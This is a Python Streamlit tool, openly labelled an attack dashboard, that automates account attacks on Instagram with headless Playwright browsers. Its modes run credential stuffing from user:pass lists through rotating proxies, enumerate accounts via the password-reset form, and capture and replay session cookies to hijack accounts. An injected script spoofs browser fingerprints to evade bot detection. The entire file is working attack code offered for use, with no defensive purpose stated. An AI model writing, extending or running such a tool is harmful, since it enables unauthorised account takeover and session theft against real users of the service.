import asyncio
import random
import pandas as pd
import streamlit as st
from playwright.async_api import async_playwright
import csv
import os
from datetime import datetime
import json

PROFILES = [
    {
        "os": "Windows",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "locale": "en-US",
        "timezone": "America/New_York",
        "geo": {"longitude": -74.006, "latitude": 40.7128},
        "viewport": {"width": 1920, "height": 1080},
        "platform": "Win32"
    },
    {
        "os": "Windows",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "locale": "en-GB",
        "timezone": "Europe/London",
        "geo": {"longitude": -0.1276, "latitude": 51.5074},
        "viewport": {"width": 1920, "height": 1080},
        "platform": "Win32"
    },
    {
        "os": "macOS",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "locale": "en-US",
        "timezone": "America/Los_Angeles",
        "geo": {"longitude": -118.2437, "latitude": 34.0522},
        "viewport": {"width": 1680, "height": 1050},
        "platform": "MacIntel"
    },
    {
        "os": "macOS",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "locale": "en-AU",
        "timezone": "Australia/Sydney",
        "geo": {"longitude": 151.2093, "latitude": -33.8688},
        "viewport": {"width": 1440, "height": 900},
        "platform": "MacIntel"
    },
    {
        "os": "Linux",
        "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "locale": "en-US",
        "timezone": "America/Chicago",
        "geo": {"longitude": -87.6298, "latitude": 41.8781},
        "viewport": {"width": 1920, "height": 1080},
        "platform": "Linux x86_64"
    }
]

st.set_page_config(page_title="Stealth Cluster Pro - Recovery & Session Theft", page_icon="⚡", layout="wide")
st.markdown("""
    <style>
    .main { background-color: #0e1117; color: #c9d1d9; }
    .stButton>button { width: 100%; border-radius: 4px; background-color: #238636; color: white; font-weight: bold; }
    .stProgress > div > div { background-color: #238636; }
    .log-area { background-color: #161b22; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: auto; }
    </style>
""", unsafe_allow_html=True)

st.title("⚡ Stealth Cluster Pro — Recovery Exploit & Session Hijack")
st.markdown("---")

with st.sidebar:
    st.header("Attack Configuration")
    attack_mode = st.selectbox("Attack Mode", ["Login", "Recovery Exploit", "Session Theft", "Session Replay"])
    creds_input = st.text_area("Credentials (user:pass) or Emails for recovery", value="target1:pass123\ntarget2@example.com", height=150)
    proxy_list = st.text_area("Proxies (http://ip:port, one per line)", value="", height=100)
    concurrency = st.slider("Concurrent browsers", 1, 8, 3)
    retries = st.number_input("Retries per attempt", min_value=1, max_value=5, value=2)
    st.caption("Session theft captures cookies for replay.")

SESSION_FILE = "stolen_sessions.csv"

def save_session(username, cookies, profile):
    os.makedirs("sessions", exist_ok=True)
    with open(f"sessions/{username}.json", "w") as f:
        json.dump({"cookies": cookies, "profile": profile, "timestamp": datetime.now().isoformat()}, f)

def load_session(username):
    try:
        with open(f"sessions/{username}.json", "r") as f:
            return json.load(f)
    except:
        return None

col1, col2 = st.columns([3, 1])

class StealthCluster:
    def __init__(self, proxy_list, concurrency, retries, mode):
        self.proxy_list = [p.strip() for p in proxy_list.split("\n") if p.strip()]
        self.concurrency = concurrency
        self.retries = retries
        self.mode = mode
        self.semaphore = asyncio.Semaphore(concurrency)
        self.playwright = None

    async def __aenter__(self):
        self.playwright = await async_playwright().start()
        return self

    async def __aexit__(self, exc_type, exc, tb):
        if self.playwright:
            await self.playwright.stop()

    def _random_browser_args(self):
        return [
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-infobars",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-web-security",
            "--disable-sync",
            "--disable-default-apps",
            "--disable-extensions",
            "--disable-component-extensions-with-background-pages",
            "--disable-client-side-phishing-detection"
        ]

    def _get_profile(self):
        return random.choice(PROFILES).copy()

    async def _launch_browser(self, proxy_url):
        launch_opts = {
            "headless": True,
            "args": self._random_browser_args()
        }
        if proxy_url:
            launch_opts["proxy"] = {"server": proxy_url}
        return await self.playwright.chromium.launch(**launch_opts)

    async def _init_script(self, profile):
        platform = profile["platform"]
        return f"""
            Object.defineProperty(navigator, 'webdriver', {{get: () => undefined}});
            Object.defineProperty(navigator, 'plugins', {{get: () => [1,2,3,4,5]}});
            Object.defineProperty(navigator, 'languages', {{get: () => ['{profile["locale"]}','en']}});
            Object.defineProperty(navigator, 'hardwareConcurrency', {{get: () => 8}});
            Object.defineProperty(navigator, 'deviceMemory', {{get: () => 8}});
            Object.defineProperty(navigator, 'platform', {{get: () => '{platform}'}});
            window.navigator.chrome = {{ runtime: {{}} }};
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (params) => (
                params.name === 'notifications' ? Promise.resolve({{state: 'denied'}}) : originalQuery(params)
            );
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(param) {{
                if (param === 37445) return 'Intel Inc.';
                if (param === 37446) return 'Intel Iris OpenGL Engine';
                return getParameter.apply(this, arguments);
            }};
            const getClientRects = Element.prototype.getClientRects;
            Element.prototype.getClientRects = function() {{
                const rects = getClientRects.call(this);
                if (rects.length && this.tagName === 'CANVAS') {{
                    const canvas = this;
                    const ctx = canvas.getContext('2d');
                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                    const data = imageData.data;
                    for (let i = 0; i < data.length; i += 4) {{
                        data[i] = data[i] ^ 1;
                    }}
                    ctx.putImageData(imageData, 0, 0);
                }}
                return rects;
            }};
            const origAudio = AudioContext.prototype.createOscillator;
            AudioContext.prototype.createOscillator = function() {{
                const osc = origAudio.call(this);
                const origStart = osc.start;
                osc.start = function(when) {{
                    try {{
                        const gain = this.context.createGain();
                        gain.gain.value = 0.001;
                        gain.connect(this.context.destination);
                        this.connect(gain);
                    }} catch(e) {{}}
                    return origStart.call(this, when);
                }};
                return osc;
            }};
        """

    # --- Login attempt with session capture ---
    async def _login_attempt(self, username, password, proxy_url, attempt):
        profile = self._get_profile()
        browser = await self._launch_browser(proxy_url)
        try:
            context = await browser.new_context(
                user_agent=profile["ua"],
                viewport=profile["viewport"],
                locale=profile["locale"],
                timezone_id=profile["timezone"],
                geolocation=profile["geo"],
                permissions=["geolocation", "notifications"],
                color_scheme=random.choice(["light", "dark"]),
                device_scale_factor=random.choice([1, 2]),
                java_script_enabled=True
            )
            await context.add_init_script(await self._init_script(profile))
            page = await context.new_page()
            await page.goto("https://www.instagram.com/accounts/login/", wait_until="networkidle", timeout=45000)
            await page.wait_for_selector("input[name='username']", timeout=15000)
            await page.click("input[name='username']")
            for char in username:
                await page.keyboard.type(char)
                await asyncio.sleep(random.uniform(0.05, 0.15))
            await asyncio.sleep(random.uniform(0.3, 0.8))
            await page.click("input[name='password']")
            for char in password:
                await page.keyboard.type(char)
                await asyncio.sleep(random.uniform(0.05, 0.15))
            await asyncio.sleep(random.uniform(0.4, 0.9))
            await page.click("button[type='submit']")
            await asyncio.sleep(random.uniform(5, 8))
            url = page.url
            content = await page.content()
            if "challenge" in url or "checkpoint" in content:
                status = "MFA / Checkpoint"
                auth = False
            elif "login" not in url and "accounts" not in url:
                status = "Authenticated"
                auth = True
                cookies = await context.cookies()
                save_session(username, cookies, profile)
            elif "incorrect" in content or "invalid" in content:
                status = "Invalid credentials"
                auth = False
            elif "rate" in content or "too many" in content:
                status = "Rate limited"
                auth = False
            else:
                status = "Unknown / Bot detection"
                auth = False
            return {"auth": auth, "status": status, "url": url, "attempt": attempt, "cookies_stored": auth}
        except Exception as e:
            return {"auth": False, "status": f"Error: {str(e)}", "url": "Error", "attempt": attempt, "cookies_stored": False}
        finally:
            await browser.close()

    # --- Recovery Exploit: enumerate users and attempt reset ---
    async def _recovery_attempt(self, identifier, proxy_url, attempt):
        profile = self._get_profile()
        browser = await self._launch_browser(proxy_url)
        try:
            context = await browser.new_context(
                user_agent=profile["ua"],
                viewport=profile["viewport"],
                locale=profile["locale"],
                timezone_id=profile["timezone"],
                geolocation=profile["geo"],
                permissions=["geolocation", "notifications"],
                color_scheme=random.choice(["light", "dark"]),
                device_scale_factor=random.choice([1, 2]),
                java_script_enabled=True
            )
            await context.add_init_script(await self._init_script(profile))
            page = await context.new_page()
            await page.goto("https://www.instagram.com/accounts/password/reset/", wait_until="networkidle", timeout=45000)
            await page.wait_for_selector("input[name='email_or_username']", timeout=15000)
            await page.fill("input[name='email_or_username']", identifier)
            await asyncio.sleep(random.uniform(0.5, 1.5))
            await page.click("button[type='submit']")
            await asyncio.sleep(random.uniform(4, 7))
            content = await page.content()
            url = page.url
            # Check for indicators
            if "checkpoint" in url or "security" in content:
                status = "Security challenge - likely exists"
                exists = True
            elif "email sent" in content.lower() or "password reset" in content.lower():
                status = "Reset sent - account exists"
                exists = True
            elif "couldn't find" in content.lower() or "no account" in content.lower():
                status = "Account not found"
                exists = False
            else:
                status = "Unknown response"
                exists = False
            return {"exists": exists, "status": status, "url": url, "attempt": attempt}
        except Exception as e:
            return {"exists": False, "status": f"Error: {str(e)}", "url": "Error", "attempt": attempt}
        finally:
            await browser.close()

    # --- Session Replay ---
    async def _replay_attempt(self, username, proxy_url, attempt):
        session = load_session(username)
        if not session:
            return {"auth": False, "status": "No stored session", "url": "", "attempt": attempt}
        profile = session.get("profile", self._get_profile())
        cookies = session["cookies"]
        browser = await self._launch_browser(proxy_url)
        try:
            context = await browser.new_context(
                user_agent=profile["ua"],
                viewport=profile["viewport"],
                locale=profile["locale"],
                timezone_id=profile["timezone"],
                geolocation=profile["geo"],
                permissions=["geolocation", "notifications"],
                color_scheme=random.choice(["light", "dark"]),
                device_scale_factor=random.choice([1, 2]),
                java_script_enabled=True
            )
            await context.add_init_script(await self._init_script(profile))
            await context.add_cookies(cookies)
            page = await context.new_page()
            await page.goto("https://www.instagram.com/", wait_until="networkidle", timeout=45000)
            await asyncio.sleep(3)
            url = page.url
            content = await page.content()
            if "login" not in url and "accounts" not in url:
                auth = True
                status = "Session valid"
            else:
                auth = False
                status = "Session expired or invalid"
            return {"auth": auth, "status": status, "url": url, "attempt": attempt}
        except Exception as e:
            return {"auth": False, "status": f"Error: {str(e)}", "url": "Error", "attempt": attempt}
        finally:
            await browser.close()

    async def try_credential(self, idx, cred, proxy_pool):
        proxy_url = random.choice(proxy_pool) if proxy_pool else None
        if self.mode == "Login":
            if ":" not in cred:
                return None
            username, password = cred.split(":", 1)
            username, password = username.strip(), password.strip()
            for attempt in range(1, self.retries + 1):
                async with self.semaphore:
                    result = await self._login_attempt(username, password, proxy_url, attempt)
                    if result["auth"]:
                        break
                    if attempt < self.retries:
                        await asyncio.sleep(random.uniform(1, 3))
            return {
                "ID": idx,
                "Identifier": username,
                "Final URL": result["url"],
                "Status": result["status"],
                "Authenticated": result["auth"],
                "Cookies Stored": result.get("cookies_stored", False),
                "Retries": attempt
            }
        elif self.mode == "Recovery Exploit":
            identifier = cred.strip()
            for attempt in range(1, self.retries + 1):
                async with self.semaphore:
                    result = await self._recovery_attempt(identifier, proxy_url, attempt)
                    if result["exists"]:
                        break
                    if attempt < self.retries:
                        await asyncio.sleep(random.uniform(1, 3))
            return {
                "ID": idx,
                "Identifier": identifier,
                "Final URL": result["url"],
                "Status": result["status"],
                "Account Exists": result["exists"],
                "Retries": attempt
            }
        elif self.mode == "Session Replay":
            username = cred.strip()
            for attempt in range(1, self.retries + 1):
                async with self.semaphore:
                    result = await self._replay_attempt(username, proxy_url, attempt)
                    if result["auth"]:
                        break
                    if attempt < self.retries:
                        await asyncio.sleep(random.uniform(1, 3))
            return {
                "ID": idx,
                "Username": username,
                "Final URL": result["url"],
                "Status": result["status"],
                "Session Valid": result["auth"],
                "Retries": attempt
            }
        else: # Session Theft is same as login but always saves cookies on success
            if ":" not in cred:
                return None
            username, password = cred.split(":", 1)
            username, password = username.strip(), password.strip()
            for attempt in range(1, self.retries + 1):
                async with self.semaphore:
                    result = await self._login_attempt(username, password, proxy_url, attempt)
                    if result["auth"]:
                        break
                    if attempt < self.retries:
                        await asyncio.sleep(random.uniform(1, 3))
            return {
                "ID": idx,
                "Username": username,
                "Final URL": result["url"],
                "Status": result["status"],
                "Authenticated": result["auth"],
                "Cookies Stolen": result.get("cookies_stored", False),
                "Retries": attempt
            }

    async def run(self, credentials):
        proxy_pool = self.proxy_list if self.proxy_list else [None]
        tasks = []
        for i, cred in enumerate(credentials):
            if not cred.strip():
                continue
            if self.mode in ["Login", "Session Theft"] and ":" not in cred:
                continue
            tasks.append(self.try_credential(i+1, cred, proxy_pool))
        return await asyncio.gather(*tasks)

if col1.button("Deploy Stealth Cluster"):
    creds = [c.strip() for c in creds_input.split("\n") if c.strip()]
    if attack_mode in ["Login", "Session Theft"]:
        creds = [c for c in creds if ":" in c]
    if not creds:
        st.error("No valid inputs provided.")
    else:
        progress = st.progress(0)
        log_area = st.empty()
        with log_area.container():
            st.markdown('<div class="log-area" id="log"></div>', unsafe_allow_html=True)
        st.text(f"Initializing {attack_mode} mode...")
        async def main():
            async with StealthCluster(proxy_list, concurrency, retries, attack_mode) as cluster:
                results = await cluster.run(creds)
                return results
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        raw = loop.run_until_complete(main())
        progress.progress(100)
        df = pd.DataFrame(raw)
        col1.dataframe(df, use_container_width=True)
        csv = df.to_csv(index=False)
        col1.download_button("Export results as CSV", csv, "cluster_results.csv", "text/csv")
        if attack_mode == "Login" or attack_mode == "Session Theft":
            auth_count = df[df["Authenticated"] == True].shape[0] if "Authenticated" in df.columns else 0
            col2.metric("Authenticated", auth_count)
        elif attack_mode == "Recovery Exploit":
            exists_count = df[df["Account Exists"] == True].shape[0] if "Account Exists" in df.columns else 0
            col2.metric("Accounts Found", exists_count)
        elif attack_mode == "Session Replay":
            valid_count = df[df["Session Valid"] == True].shape[0] if "Session Valid" in df.columns else 0
            col2.metric("Valid Sessions", valid_count)
        col2.metric("Total Attempts", len(df))
        st.success("Cluster execution finished.")

with col2:
    st.metric("Max Concurrency", concurrency)
    st.metric("Retry Budget", retries)
    st.metric("Proxy Pool", len([p for p in proxy_list.split("\n") if p.strip()]))